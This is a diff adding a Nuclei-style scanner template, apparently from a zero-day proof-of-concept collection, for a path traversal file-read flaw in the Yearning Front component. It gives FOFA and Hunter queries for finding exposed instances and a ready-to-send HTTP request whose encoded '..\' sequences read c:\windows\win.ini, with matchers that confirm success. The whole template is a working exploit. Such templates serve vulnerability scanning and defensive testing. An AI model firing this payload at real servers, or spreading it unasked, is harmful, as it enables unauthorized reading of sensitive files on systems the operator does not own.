@@ -1,0 +1,27 @@
+id: yearning-front-file-read
+
+info:
+  name: "Yearning Front 组件任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: fofa: app="Yearning" hunter: app.name="Yearning"
+      该漏洞源于Yearning Front组件未正确校验文件访问路径，攻击者可利用路径遍历技术读取系统任意文件。通过构造恶意请求参数，可获取敏感配置文件、系统日志等非授权资源，导致信息泄露风险。
+  tags: Yearning
+
+http:
+- raw:
+  - |
+    GET /front/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cc:%5Cwindows%5Cwin.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
